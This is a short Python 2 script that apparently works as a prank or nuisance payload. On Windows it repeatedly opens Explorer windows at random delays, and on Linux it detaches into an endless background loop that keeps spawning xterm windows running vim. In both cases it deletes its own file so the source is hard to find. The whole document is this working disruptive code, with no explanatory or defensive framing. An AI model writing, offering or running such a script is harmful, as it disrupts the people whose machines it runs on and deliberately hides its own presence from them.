#!/usr/bin/env python
#-*- coding: utf-8 -*-

###
# IMPORTS
#
from os         import name     as currentOS
from os         import path     as p
from random     import randint
from subprocess import call
from sys        import exit
from time       import sleep
###
# SPECIFIC IMPORTS
#
if currentOS == 'nt':
    from os         import system
else:
    from os         import fork
    from os         import setsid

###
# FUNCTIONS
#
'''
Check and correct the windows path (replace Example example by "Example example")
Return string
'''
def getWindowsPath():
    path  = p.realpath(__file__)
    spath = path.split('\\')
    index = 0
    for segment in spath:
        if ' ' in segment:
            segment = segment[::-1]
            segment+="\""
            segment = segment[::-1]
            segment+="\""
            spath[index] = segment
        index+=1
    return "\\".join(spath)
'''
self destroy the file regarding current OS then quit
'''
def selfDestruction():
    if currentOS == 'nt':
        selfDestruct = "del " \
                     + getWindowsPath()
        system(selfDestruct)
    else:
        call(["rm",p.realpath(__file__)])
    exit(0)
   
###
# MAIN
#

MAX_LATENCY = 5*60  # max latency = 5 minutes

if __name__ == "__main__":
    # Windows
    if currentOS == 'nt':
        for i in xrange(15):
            sleep(randint(0,MAX_LATENCY))
            system("start %windir%\explorer.exe")
        selfDestruction()
        
    #Linux
    else:
        pid = fork()
        if pid==0:
            setsid()
            pid = fork()
            if pid==0:
                # Now run as a background task
                while True:
                    sleep(randint(0,MAX_LATENCY))
                    call(["xterm","vim"])
        else:
            selfDestruction()
